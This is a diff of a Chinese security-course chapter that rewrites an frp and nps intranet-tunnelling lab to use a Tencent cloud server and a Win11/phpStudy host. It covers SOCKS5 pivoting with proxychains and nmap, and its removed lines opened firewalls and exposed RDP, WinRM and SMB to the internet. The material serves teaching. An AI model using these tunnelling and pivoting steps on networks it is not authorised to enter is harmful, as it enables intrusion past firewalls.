@@ -34,7 +34,7 @@ title: "08.项目八 Windows内网安全"
 
 | 类型 | 内容 | 说明 |
 | --- | --- | --- |
-| 重点 | frp 内网穿透的部署与配置 | 阿里云 ECS 部署 frps + 本地虚拟机部署 frpc，配置 TCP/SOCKS5 隧道 |
+| 重点 | frp 内网穿透的部署与配置 | 腾讯云 CVM 部署 frps + 本机 Win11/phpStudy 部署 frpc，配置 TCP/SOCKS5 隧道 |
 | 重点 | 内网信息收集与横向移动 | `ipconfig`/`arp`/`net view` 发现内网，Pass-the-Hash + Impacket 实现横向移动 |
 | 难点 | SOCKS5 代理与 proxychains | 理解"一条隧道穿透整个内网"的机制，以及如何让任意工具通过代理工作 |
 | 难点 | 内网安全纵深防御体系 | 从攻击者视角理解"为什么防火墙不够"，设计多层防御策略 |
@@ -81,8 +81,8 @@ title: "08.项目八 Windows内网安全"
 frp 的解决方案（利用出站通道）：
 
   ┌────────────┐         ┌────────────────┐         ┌────────────┐
-  │   攻击机   │         │  阿里云 ECS     │         │  内网主机   │
-  │   Kali     │         │  (有公网 IP)    │         │  SRV02     │
+  │   攻击机   │         │  腾讯云 CVM     │         │  内网主机   │
+  │ Kali/Win11 │         │  (有公网 IP)    │         │ Win11实验机 │
   │            │         │  frps 服务端    │         │  frpc 客户端│
   │            │         │                 │         │            │
   │  访问      │   ②     │  转发请求       │   ③    │  提供服务   │
@@ -96,7 +96,7 @@ frp 的解决方案（利用出站通道）：
        ②③ 攻击机通过这条已建立的连接，反向访问内网服务
 ```
 
-**用人话说**：frpc（内网主机上）主动"打电话"给 frps（阿里云服务器），保持通话不断。之后攻击机想访问内网服务时，frps 就把请求顺着这条"电话线"转给 frpc，frpc 再转给本地服务。
+**用人话说**：frpc（内网主机上）主动"打电话"给 frps（腾讯云服务器），保持通话不断。之后攻击机想访问内网服务时，frps 就把请求顺着这条"电话线"转给 frpc，frpc 再转给本地服务。
 
 这就是为什么叫"**反向**代理"——正常的代理是"帮你往外访问"，frp 是"帮外面访问你"。
 
@@ -104,9 +104,9 @@ frp 的解决方案（利用出站通道）：
 
 | 概念 | 说明 |
 | --- | --- |
-| **frps** | 服务端，部署在有公网 IP 的机器上（本课用阿里云 ECS） |
-| **frpc** | 客户端，运行在内网主机上（本课用 SRV02 虚拟机） |
-| **TCP 隧道** | 把内网的一个端口映射到 ECS 的一个端口（如 3389 → 10001） |
+| **frps** | 服务端，部署在有公网 IP 的机器上（本课用腾讯云 CVM） |
+| **frpc** | 客户端，运行在内网主机上（本课用本机 Win11 + phpStudy） |
+| **TCP 隧道** | 把内网的一个端口映射到 CVM 的一个端口（如 80 → 10002） |
 | **SOCKS5 代理** | 一条隧道，让攻击机"进入"整个内网（任务二详细讲） |
 | **token 认证** | frpc 连接 frps 时的密码，防止别人连上来 |
 
@@ -120,55 +120,55 @@ frp 的解决方案（利用出站通道）：
 
 ### 实验环境总体说明
 
-> 本项目使用 **阿里云 ECS** 作为公网穿透服务器，配合**本地虚拟机**模拟内网主机，通过 frp 实现真实的内网穿透。
+> 本项目使用 **腾讯云 CVM** 作为公网穿透服务器，配合**本机 Win11 + phpStudy** 作为内网 Web 主机，通过 frp 实现真实的内网穿透。
 >
 > **实验架构**：
 >
 > | 设备 | 角色 | 运行位置 | 操作系统 |
 > | --- | --- | --- | --- |
-> | **阿里云 ECS** | 公网穿透服务器（frps） | 阿里云 | Ubuntu 22.04 |
-> | **SRV02** | 内网主机（frpc） | 本地 VMware/VirtualBox | Windows Server 2022 |
-> | **Kali Linux** | 攻击机 | 本地 VMware/VirtualBox | Kali Linux 2024+ |
+> | **腾讯云 CVM** | 公网穿透服务器（frps） | 腾讯云 | Ubuntu 22.04 |
+> | **Win11 实验主机** | 内网 Web 主机（phpStudy + frpc） | 本机电脑 | Windows 11 |
+> | **攻击/验证端** | 浏览器、Nmap、proxychains 等验证工具 | 本机/教师演示环境 | Windows 11、WSL 或 Kali |
 >
-> **预估费用**：ECS 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 ECS 实例和弹性公网 IP，避免持续扣费。**
+> **预估费用**：CVM 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 CVM 实例和公网 IP，避免持续扣费。**
 >
 > ⚠️ **配置要求**：
-> - ECS 需要分配**弹性公网 IP（EIP）**，安全组需放行 frp 相关端口
-> - SRV02 为本地虚拟机，NAT 模式（需能访问互联网以连接 ECS 的 frps）
-> - Kali 为本地虚拟机，需能访问互联网（连接 ECS 的 frp 映射端口）
+> - CVM 需要分配**公网 IP**，安全组需放行 frp 相关端口
+> - Win11 实验主机需能访问互联网，以便 frpc 主动连接 CVM 的 frps
+> - 本项目基础实验不再要求本地虚拟机；需要 Linux 工具的扫描步骤可由教师演示环境、WSL 或 Kali 完成
 
 ---
 
-### 实验1：阿里云服务器购买与frp服务端部署
+### 实验1：腾讯云服务器购买与frp服务端部署
 
-> **实验目标**：购买阿里云 ECS 服务器，配置安全组，部署 frp 服务端（frps）。
+> **实验目标**：购买腾讯云 CVM 服务器，配置安全组，通过腾讯云网页登录部署 frp 服务端（frps）。
 
-**第一步：购买阿里云 ECS 服务器**
+**第一步：购买腾讯云 CVM 服务器**
 
-1. 访问阿里云官网，注册并登录账号
-2. 进入 **云服务器 ECS** 控制台，点击"创建实例"
+1. 访问腾讯云官网，注册并登录账号
+2. 进入 **云服务器 CVM** 控制台，点击"新建/购买实例"
 3. 配置如下：
 
 | 配置项 | 推荐选择 |
 | --- | --- |
 | **计费方式** | 按量付费（实验用完即释放） |
-| **地域** | 离你最近的区域（如华东1-杭州） |
-| **实例规格** | ecs.t6-c1m2.large（2 vCPU / 4 GB）或更低规格 |
+| **地域** | 离你最近的区域（如广州、上海、南京等） |
+| **实例规格** | 2 vCPU / 2 GB 或 2 vCPU / 4 GB 均可 |
 | **镜像** | Ubuntu 22.04 64位 |
-| **系统盘** | 40 GB 高效云盘 |
-| **网络** | 专有网络 VPC（使用默认） |
-| **公网IP** | 选择"分配公网 IPv4 地址"（按使用流量计费） |
+| **系统盘** | 40 GB 云硬盘 |
+| **网络** | 私有网络 VPC（使用默认） |
+| **公网IP** | 勾选"分配免费公网 IPv4 地址"或绑定弹性公网 IP |
 | **登录凭证** | 设置 root 密码 |
 
-4. 创建完成后，在实例列表中记录 **公网 IP 地址**（后续以 `<ECS公网IP>` 表示）
+4. 创建完成后，在实例列表中记录 **公网 IP 地址**（后续以 `<CVM公网IP>` 表示）
 
-> ⚠️ **费用提醒**：按量付费实验 3-4 小时约 ¥3-8。**实验结束后务必释放 ECS 实例和弹性公网 IP！**
+> ⚠️ **费用提醒**：按量付费实验 3-4 小时约 ¥3-8。**实验结束后务必释放 CVM 实例和公网 IP！**
 
 **第二步：配置安全组**
 
-安全组是阿里云 ECS 的虚拟防火墙，控制哪些端口可以从外部访问。
+安全组是腾讯云 CVM 的虚拟防火墙，控制哪些端口可以从外部访问。
 
-1. ECS 控制台 → 安全组 → 配置规则
+1. CVM 控制台 → 安全组 → 配置规则
 2. 添加以下**入方向**规则：
 
 | 协议类型 | 端口范围 | 授权对象 | 用途 |
@@ -179,14 +179,18 @@ frp 的解决方案（利用出站通道）：
 | TCP | 10000-20000 | 0.0.0.0/0 | frp 隧道映射端口范围 |
 | ICMP | -1/-1 | 0.0.0.0/0 | ping 测试 |
 
-> 💡 **安全组说明**：阿里云安全组默认拒绝所有入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源，实验环境可用；生产环境应限制为特定 IP。
+> 💡 **安全组说明**：腾讯云安全组默认拒绝未放行的入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源，实验环境可用；生产环境应限制为特定 IP。
 
-**第三步：SSH 连接 ECS 并安装 frp**
+**第三步：使用腾讯云网页登录 CVM 并安装 frp**
+
+本实验不使用本机终端 SSH 连接服务器，统一使用腾讯云控制台提供的网页登录方式：
+
+1. CVM 控制台 → 实例列表 → 找到目标服务器
+2. 点击 **登录** → 选择 **标准登录/Linux WebShell**（不同控制台界面名称可能略有差异）
+3. 输入 root 密码进入网页终端
+4. 后续命令均在这个网页终端中执行
 
 ```bash
-# 在本地电脑上 SSH 连接 ECS
-ssh root@<ECS公网IP>
-
 # 更新系统
 apt update && apt upgrade -y
 
@@ -206,8 +210,13 @@ ls frps frps.toml
 **第四步：配置并启动 frps**
 
 ```bash
-# 编辑服务端配置
-cat > /opt/frp/frps.toml << 'EOF'
+# 使用 vim 编辑服务端配置
+vim /opt/frp/frps.toml
+```
+
+在 `vim` 中按 `i` 进入插入模式，写入以下内容；写完后按 `Esc`，输入 `:wq` 保存退出：
+
+```toml
 bindPort = 7000
 
 webServer.addr = "0.0.0.0"
@@ -225,8 +234,9 @@ log.maxDays = 7
 allowPorts = [
   { start = 10000, end = 20000 }
 ]
-EOF
+```
 
+```bash
 # 启动 frps
 /opt/frp/frps -c /opt/frp/frps.toml
 
@@ -248,11 +258,16 @@ ss -tlnp | grep -E "7000|7500"
 
 **第五步（可选）：将 frps 注册为 systemd 服务（推荐）**
 
-上面的 `bg + disown` 方式简单但不可靠——SSH 断开或服务器重启后 frps 不会自动恢复。在真实运维中，推荐注册为 systemd 服务：
+上面的 `bg + disown` 方式简单但不可靠——网页登录会话断开或服务器重启后 frps 不会自动恢复。在真实运维中，推荐注册为 systemd 服务：
 
 ```bash
-# 创建 systemd 服务文件
-cat > /etc/systemd/system/frps.service << 'EOF'
+# 使用 vim 创建 systemd 服务文件
+vim /etc/systemd/system/frps.service
+```
+
+写入以下内容，保存退出：
+
+```ini
 [Unit]
 Description=frp server (frps)
 After=network.target
@@ -265,8 +280,9 @@ RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
-EOF
+```
 
+```bash
 # 启用并启动服务
 systemctl daemon-reload
 systemctl enable frps
@@ -282,51 +298,218 @@ systemctl restart frps   # 重启
 journalctl -u frps -f    # 查看实时日志
 ```
 
-> 💡 **为什么推荐 systemd？** SSH 断开不会影响服务；服务器重启后 frps 自动启动；日志可通过 `journalctl` 统一管理。课堂实验用 `bg + disown` 即可，生产环境务必用 systemd。
+> 💡 **为什么推荐 systemd？** 网页登录会话断开不会影响服务；服务器重启后 frps 自动启动；日志可通过 `journalctl` 统一管理。课堂实验用 `bg + disown` 即可，生产环境务必用 systemd。
 
-**第五步：访问 frp Dashboard**
+**第六步：访问 frp Dashboard**
 
-在本地浏览器中打开 `http://<ECS公网IP>:7500`，用户名 `admin`，密码 `admin123`。预期显示 frp Dashboard 页面（此时无客户端连接）。
+在本地浏览器中打开 `http://<CVM公网IP>:7500`，用户名 `admin`，密码 `admin123`。预期显示 frp Dashboard 页面（此时无客户端连接）。
 
 ---
 
-### 实验2：本地虚拟机配置与frp客户端部署
+### 实验2：Win11 + phpStudy 配置与frp客户端部署
 
-> **实验目标**：在本地 Windows Server 虚拟机上启用服务、部署 frp 客户端，通过隧道将服务暴露出去。
+> **实验目标**：在本机 Windows 11 上安装 phpStudy，搭建一个可适配手机端的内网页面，部署 frp 客户端（frpc），通过腾讯云 CVM 将本机 Web 服务暴露到公网进行验证。
 
-**第一步：准备 SRV02 虚拟机**
+**第一步：安装并启动 phpStudy**
 
-SRV02 是运行在本地 VMware/VirtualBox 中的 Windows Server 虚拟机，模拟企业内网中的服务器。网络模式使用 NAT（需要能访问互联网以连接阿里云 ECS）。
+1. 在 Win11 浏览器访问 phpStudy 官网，下载 Windows 版安装包
+2. 按默认路径安装，建议安装到 `C:\phpstudy_pro`
+3. 打开 phpStudy，启动 **Apache** 服务
+4. 在浏览器访问 `http://127.0.0.1`，确认能看到默认页面
 
-**第二步：启用基础服务**
+> 💡 **说明**：本实验用本机 Win11 代替本地虚拟机。phpStudy 提供 Web 服务，frpc 运行在 Win11 上，主动连接腾讯云 CVM 的 frps。
 
-```powershell
-# 在 SRV02 上以管理员身份运行 PowerShell
+**第二步：创建一个美观的响应式测试页面**
 
-# 1. 启用远程桌面
-Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+在 phpStudy 的网站根目录中创建或覆盖 `index.html`。常见路径为：
 
-# 2. 启用 WinRM（远程管理）
-Enable-PSRemoting -Force
-
-# 3. 安装 IIS Web 服务器
-Install-WindowsFeature -Name Web-Server -IncludeManagementTools
-
-# 4. 创建测试页面
-Set-Content -Path "C:\inetpub\wwwroot\index.html" -Value "<html><body><h1>SRV02 内网服务器</h1><p>frp 隧道穿透成功！</p></body></html>"
-
-# 5. 关闭防火墙（仅实验环境）
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-
-# 6. 验证本地服务
-curl http://localhost
+```text
+C:\phpstudy_pro\WWW\index.html
 ```
+
+写入以下页面内容：
+
+```html
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Win11 phpStudy 内网服务</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --ink: #17202a;
+      --muted: #5c6b7a;
+      --line: #d8e0e8;
+      --brand: #0f8b8d;
+      --accent: #f2b134;
+      --bg: #f7fafc;
+      --panel: #ffffff;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: "Microsoft YaHei", "Segoe UI", sans-serif;
+      color: var(--ink);
+      background:
+        linear-gradient(135deg, rgba(15, 139, 141, .12), rgba(242, 177, 52, .12)),
+        var(--bg);
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    main {
+      width: min(960px, 100%);
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      box-shadow: 0 18px 50px rgba(23, 32, 42, .12);
+      overflow: hidden;
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: 1.2fr .8fr;
+      gap: 28px;
+      padding: 42px;
+      align-items: center;
+    }
+
+    h1 {
+      margin: 0 0 14px;
+      font-size: clamp(30px, 5vw, 54px);
+      line-height: 1.05;
+      letter-spacing: 0;
+    }
+
+    p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 17px;
+      line-height: 1.8;
+    }
+
+    .status {
+      display: grid;
+      gap: 12px;
+      margin-top: 28px;
+    }
+
+    .item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 14px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: #fbfdff;
+      font-size: 15px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--brand);
+      box-shadow: 0 0 0 5px rgba(15, 139, 141, .12);
+      flex: 0 0 auto;
+    }
+
+    .visual {
+      border-radius: 8px;
+      border: 1px solid var(--line);
+      padding: 22px;
+      background: linear-gradient(160deg, #e8f6f6, #fff7df);
+    }
+
+    .screen {
+      min-height: 250px;
+      border-radius: 8px;
+      background: #17202a;
+      color: #e9f5f5;
+      padding: 18px;
+      display: grid;
+      align-content: space-between;
+      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, .08);
+    }
+
+    .chip {
+      display: inline-flex;
+      width: max-content;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, .1);
+      color: #fff;
+      font-size: 13px;
+    }
+
+    .metric {
+      font-size: 44px;
+      font-weight: 700;
+      letter-spacing: 0;
+    }
+
+    footer {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 18px 42px;
+      border-top: 1px solid var(--line);
+      color: var(--muted);
+      font-size: 14px;
+      background: #fbfdff;
+    }
+
+    @media (max-width: 760px) {
+      body { padding: 14px; }
+      .hero { grid-template-columns: 1fr; padding: 28px; }
+      footer { flex-direction: column; padding: 16px 28px; }
+      .screen { min-height: 210px; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <section class="hero">
+      <div>
+        <h1>内网 Web 服务已就绪</h1>
+        <p>这是运行在本机 Win11 phpStudy 中的测试页面。公网访问请求会先到达腾讯云 CVM，再通过 frp 隧道转发回本机。</p>
+        <div class="status">
+          <div class="item"><span class="dot"></span><span>phpStudy Apache 正在提供本地 Web 服务</span></div>
+          <div class="item"><span class="dot"></span><span>frpc 主动连接腾讯云 frps</span></div>
+          <div class="item"><span class="dot"></span><span>页面已适配手机、平板和桌面浏览器</span></div>
+        </div>
+      </div>
+      <div class="visual" aria-hidden="true">
+        <div class="screen">
+          <span class="chip">CVM :10002 → Win11 :80</span>
+          <div class="metric">HTTP 200</div>
+          <span>frp tunnel online</span>
+        </div>
+      </div>
+    </section>
+    <footer>
+      <span>Windows 服务器安全配置 · 项目八</span>
+      <span>Win11 + phpStudy + frp</span>
+    </footer>
+  </main>
+</body>
+</html>
+```
+
+保存后访问 `http://127.0.0.1`，确认页面能正常显示；再用手机浏览器访问同一公网映射地址时，页面会自动适配窄屏。
 
 **第三步：下载并配置 frpc**
 
 ```powershell
-# 在 SRV02 上下载 Windows 版 frp
+# 在 Win11 上以管理员身份打开 PowerShell
 cd C:\
 Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_windows_amd64.zip" -OutFile "frp.zip"
 Expand-Archive -Path "frp.zip" -DestinationPath "C:\frp" -Force
@@ -335,10 +518,10 @@ Expand-Archive -Path "frp.zip" -DestinationPath "C:\frp" -Force
 notepad C:\frp\frpc.toml
 ```
 
-写入以下内容（**将 `<ECS公网IP>` 替换为你的 ECS 实际公网 IP**）：
+写入以下内容（**将 `<CVM公网IP>` 替换为你的腾讯云 CVM 实际公网 IP**）：
 
 ```toml
-serverAddr = "<ECS公网IP>"
+serverAddr = "<CVM公网IP>"
 serverPort = 7000
 
 auth.method = "token"
@@ -347,15 +530,7 @@ auth.token = "ClassDemo2025"
 log.to = "./frpc.log"
 log.level = "info"
 
-# RDP映射：外部访问 <ECS公网IP>:10001 → SRV02 的 3389
-[[proxies]]
-name = "rdp"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 3389
-remotePort = 10001
-
-# Web映射：外部访问 <ECS公网IP>:10002 → SRV02 的 80
+# Web映射：外部访问 <CVM公网IP>:10002 → Win11 phpStudy 的 80
 [[proxies]]
 name = "web"
 type = "tcp"
@@ -363,23 +538,7 @@ localIP = "127.0.0.1"
 localPort = 80
 remotePort = 10002
 
-# WinRM映射：外部访问 <ECS公网IP>:10003 → SRV02 的 5985
-[[proxies]]
-name = "winrm"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 5985
-remotePort = 10003
-
-# SMB映射：外部访问 <ECS公网IP>:10004 → SRV02 的 445
-[[proxies]]
-name = "smb"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 445
-remotePort = 10004
-
-# SOCKS5代理：通过隧道访问SRV02本地网络
+# SOCKS5代理：通过隧道访问 Win11 实验主机本地网络
 [[proxies]]
 name = "socks5"
 type = "tcp"
@@ -387,6 +546,8 @@ remotePort = 10080
 [proxies.plugin]
 type = "socks5"
 ```
+
+> ⚠️ **扩展说明**：RDP、WinRM、SMB 等高风险服务不再作为本机基础实验默认开放。后续弱口令、PtH 等内容应使用教师授权的专用靶机或课堂演示环境，避免把个人电脑的管理端口暴露到公网。
 
 **第四步：启动 frpc**
 
@@ -396,13 +557,12 @@ C:\frp\frpc.exe -c C:\frp\frpc.toml
 
 # 预期输出：
 # [I] login to server success
-# [I] proxy added: [rdp web winrm smb socks5]
-# [I] [rdp] start proxy success
+# [I] proxy added: [web socks5]
 # [I] [web] start proxy success
-# ...
+# [I] [socks5] start proxy success
 ```
 
-> ⚠️ **如果连接失败**：检查（1）阿里云安全组是否放行 7000 端口；（2）frpc.toml 中 IP 和 token 是否正确；（3）SRV02 是否能 ping 通 ECS。
+> ⚠️ **如果连接失败**：检查（1）腾讯云安全组是否放行 7000 端口；（2）frpc.toml 中 IP 和 token 是否正确；（3）Win11 是否能访问互联网；（4）phpStudy 的 Apache 是否已启动。
 
 **第五步（可选）：将 frpc 注册为 Windows 服务（推荐）**
 
@@ -440,40 +600,39 @@ Get-Content C:\frp\service.log -Tail 20   # 查看日志
 
 ### 实验3：验证 frp 隧道穿透效果
 
-> **实验目标**：验证 frp 隧道是否成功将 SRV02 的内网服务暴露到公网。
+> **实验目标**：验证 frp 隧道是否成功将 Win11 phpStudy 的内网 Web 服务暴露到公网。
 
 **第一步：查看 frp Dashboard**
 
-浏览器打开 `http://<ECS公网IP>:7500`，刷新页面，应看到 5 条隧道全部在线。
+浏览器打开 `http://<CVM公网IP>:7500`，刷新页面，应看到 `web` 和 `socks5` 两条隧道在线。
 
 **第二步：验证各隧道端口**
 
 ```bash
-# 在 Kali 上执行
-nmap -p 10001,10002,10003,10004 <ECS公网IP>
+# 在具备 nmap 的验证环境中执行
+nmap -p 10002,10080 <CVM公网IP>
 
-# 预期：四个端口全部 open
+# 预期：10002 和 10080 端口 open
 ```
 
 **第三步：验证 Web 穿透**
 
 ```bash
-curl http://<ECS公网IP>:10002
-# 预期：返回 "SRV02 内网服务器 - frp 隧道穿透成功！"
+curl http://<CVM公网IP>:10002
+# 预期：返回 Win11 phpStudy 响应式页面的 HTML
 ```
 
-**第四步：验证 RDP 穿透**
+也可以直接用电脑或手机浏览器访问：
 
-```bash
-# Kali 上通过 frp 隧道连接 SRV02 远程桌面
-xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignore
+```text
+http://<CVM公网IP>:10002
 ```
 
-或在 Windows 宿主机上打开"远程桌面连接"（mstsc），计算机填 `<ECS公网IP>:10001`。
+预期：显示实验 2 创建的“内网 Web 服务已就绪”页面，并且手机端布局正常。
 
 > ⚠️ **关键理解**：
-> - SRV02 在本地内网中，没有公网 IP，但通过 frp 隧道，任何人都可以通过阿里云 ECS 的公网 IP 访问 SRV02 的服务
-> - frpc 只需一条**出站连接**（到 ECS:7000），即可将所有内网服务暴露出去
+> - Win11 实验主机在本地内网中，没有直接对外开放的公网 IP，但通过 frp 隧道，外部可以通过腾讯云 CVM 的公网 IP 访问本机 phpStudy 页面
+> - frpc 只需一条**出站连接**（到 CVM:7000），即可将指定内网服务暴露出去
 > - 企业防火墙通常不阻止出站连接，这正是内网穿透工具能工作的根本原因
 
 ---
@@ -484,9 +643,9 @@ xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignor
 | --- | --- |
 | 内网为什么不安全 | 防火墙只防"外面进不来"，没防"里面出去"和"进来后横向移动" |
 | 内网穿透原理 | 利用防火墙不拦截出站连接的特性，内网主机主动向外建立隧道，外部通过隧道反向访问内网 |
-| frp 架构 | frps（服务端，部署在阿里云ECS）+ frpc（客户端，运行在内网主机） |
+| frp 架构 | frps（服务端，部署在腾讯云 CVM）+ frpc（客户端，运行在内网主机） |
 | frp 核心概念 | TCP 隧道（端口映射）、token 认证（密码保护）、Dashboard（可视化管理） |
-| 阿里云安全组 | ECS 的虚拟防火墙，控制入站/出站流量，默认拒绝所有入站 |
+| 腾讯云安全组 | CVM 的虚拟防火墙，控制入站/出站流量，默认拒绝未放行的入站 |
 | 反向代理 | frp 的本质——帮外面的攻击机"反过来"访问内网主机 |
 
 ---
@@ -497,18 +656,18 @@ xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignor
 
 ### SOCKS5 代理与 proxychains
 
-上面的实验中，frp 将 SRV02 的每个服务端口逐一映射到 ECS 上（TCP 隧道）。但 frp 还有一种更强大的模式——**SOCKS5 代理**：只需一条隧道，就可以让攻击机的**所有网络流量**通过 SRV02 转发，就像攻击机直接处于 SRV02 的内网中一样。
+上面的实验中，frp 将 Win11 实验主机的 Web 端口映射到 CVM 上（TCP 隧道）。但 frp 还有一种更强大的模式——**SOCKS5 代理**：只需一条隧道，就可以让攻击机的**所有网络流量**通过 Win11 实验主机转发，就像攻击机直接处于这台主机所在的内网中一样。
 
 ```
 TCP隧道模式（逐一映射）：
-  Kali → ECS:10001 → SRV02:3389（RDP）
-  Kali → ECS:10002 → SRV02:80   （Web）
-  Kali → ECS:10003 → SRV02:5985 （WinRM）
+  验证端 → CVM:10002 → Win11实验主机:80（phpStudy Web）
+  验证端 → CVM:10001 → 授权靶机:3389（RDP，扩展演示）
+  验证端 → CVM:10004 → 授权靶机:445（SMB，扩展演示）
   缺点：每暴露一个服务就要加一条配置
 
 SOCKS5代理模式（一键穿透）：
-  Kali → ECS:10080 → SRV02（SOCKS5服务）→ SRV02可访问的任何地址:任何端口
-  优点：一条隧道即可访问 SRV02 所在网络中的所有服务
+  验证端 → CVM:10080 → Win11实验主机（SOCKS5服务）→ Win11可访问的任何地址:任何端口
+  优点：一条隧道即可访问 Win11 实验主机所在网络中的服务
 ```
 
 **proxychains** 是 Linux 下的代理链工具，可以强制让任何程序的网络流量通过 SOCKS5 代理转发。配合 frp 的 SOCKS5 隧道，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作。
@@ -524,7 +683,7 @@ SOCKS5代理模式（一键穿透）：
 **第一步：确认 SOCKS5 代理可用**
 
 ```bash
-nmap -p 10080 <ECS公网IP>
+nmap -p 10080 <CVM公网IP>
 # 预期：10080/tcp open
 ```
 
@@ -532,53 +691,55 @@ nmap -p 10080 <ECS公网IP>
 
 ```bash
 # 编辑 proxychains 配置
-sudo nano /etc/proxychains4.conf
+sudo vim /etc/proxychains4.conf
 
 # 在文件末尾 [ProxyList] 部分替换为：
 # [ProxyList]
-# socks5 <ECS公网IP> 10080
+# socks5 <CVM公网IP> 10080
 ```
 
-**第三步：通过 SOCKS5 代理访问 SRV02**
+**第三步：通过 SOCKS5 代理访问 Win11 phpStudy**
 
 ```bash
-# 通过代理访问 SRV02 的 Web 服务
+# 通过代理访问 Win11 实验主机的 Web 服务
 proxychains curl http://127.0.0.1
-# 预期：返回 SRV02 的 IIS 页面（SOCKS5 代理从 SRV02 本地发起连接，127.0.0.1 就是 SRV02）
+# 预期：返回 phpStudy 页面（SOCKS5 代理从 Win11 本地发起连接，127.0.0.1 就是 Win11 实验主机）
 
-# 通过代理扫描 SRV02 的端口
-proxychains nmap -sT -p 21,80,135,139,445,3389,5985 127.0.0.1
-# 预期：80、135、139、445、3389、5985 端口 open
+# 通过代理扫描 Win11 实验主机的常见端口
+proxychains nmap -sT -p 80,135,139,445 127.0.0.1
+# 预期：80 端口 open；其他端口是否开放取决于本机服务状态
 ```
 
-> 💡 **为什么用 127.0.0.1？**：SOCKS5 代理的连接是从 frpc（SRV02）本地发起的。当 proxychains 把请求发给 SOCKS5 代理时，代理在 SRV02 上向 127.0.0.1 发起连接——即 SRV02 自身。
+> 💡 **为什么用 127.0.0.1？**：SOCKS5 代理的连接是从 frpc（Win11 实验主机）本地发起的。当 proxychains 把请求发给 SOCKS5 代理时，代理在 Win11 上向 127.0.0.1 发起连接——即 Win11 实验主机自身。
 
 **第四步：浏览器通过 SOCKS5 代理**
 
 ```
 Firefox 设置方法：
 1. 设置 → 常规 → 网络设置 → 手动代理配置
-2. SOCKS 主机：<ECS公网IP>  端口：10080  选择 SOCKS v5
+2. SOCKS 主机：<CVM公网IP>  端口：10080  选择 SOCKS v5
 3. 勾选"代理 DNS 时使用 SOCKS v5"
 
 访问 http://127.0.0.1
-预期：显示 SRV02 的 IIS 页面
+预期：显示 Win11 phpStudy 页面
 ```
 
 > ⚠️ **proxychains 下的 nmap 限制**：只能用 `-sT`（TCP Connect）扫描，不能用 `-sS`（SYN扫描）；不能用 ICMP ping；速度较慢。
 
-> 💡 **真实内网场景**：在真实渗透中，SRV02 通常处于包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可扫描整个内网网段，发现更多目标。这正是攻击者突破单台主机后扩展战果的核心手段。
+> 💡 **真实内网场景**：在真实渗透中，已控主机通常处于包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可扫描整个内网网段，发现更多目标。这正是攻击者突破单台主机后扩展战果的核心手段。
 
 ---
 
-### 实验5：nps 内网穿透（Web管理界面）
+### 实验5：nps 内网穿透独立实验（Web管理界面）
 
-> ⚠️ **前置条件**：完成实验1-3。本实验作为 frp 的补充对比。
+> **实验目标**：独立体验 nps 的 Web 管理界面。只需要腾讯云 CVM 和本机 Win11/phpStudy，不依赖前面的 frp 隧道。
+>
+> ⚠️ **前置条件**：CVM 安全组放行 8080（nps Web 管理）、8024（npc 客户端连接）和 10012（Web 映射端口）；Win11 上 phpStudy 的 Apache 已启动。
 
-**第一步：在 ECS 上安装 nps 服务端**
+**第一步：在腾讯云 CVM 上安装 nps 服务端**
 
 ```bash
-# 在 ECS 上执行
+# 在腾讯云网页登录终端中执行
 cd /opt
 wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
 mkdir nps && tar -xzf linux_amd64_server.tar.gz -C nps
@@ -588,8 +749,8 @@ cd nps
 **第二步：配置并启动 nps**
 
 ```bash
-# 编辑配置
-nano conf/nps.conf
+# 使用 vim 编辑配置
+vim conf/nps.conf
 ```
 
 确认关键配置：
@@ -602,7 +763,7 @@ bridge_port=8024
 bridge_type=tcp
 ```
 
-> ⚠️ **安全组提醒**：需放行 8080（Web管理）和 8024（客户端连接）端口。
+> ⚠️ **安全组提醒**：需放行 8080（Web管理）、8024（客户端连接）和 10012（Web 映射）端口。
 
 ```bash
 # 启动 nps
@@ -612,27 +773,29 @@ bridge_type=tcp
 
 **第三步：通过 Web 界面添加客户端和隧道**
 
-1. 浏览器访问 `http://<ECS公网IP>:8080`，登录 admin/admin123
-2. 客户端 → 新增 → 备注名 `SRV02`，验证密钥 `npstest2025` → 保存
-3. 点击 SRV02 旁的"隧道"→ 新增 TCP 隧道：服务端端口 10001，目标 `127.0.0.1:3389`
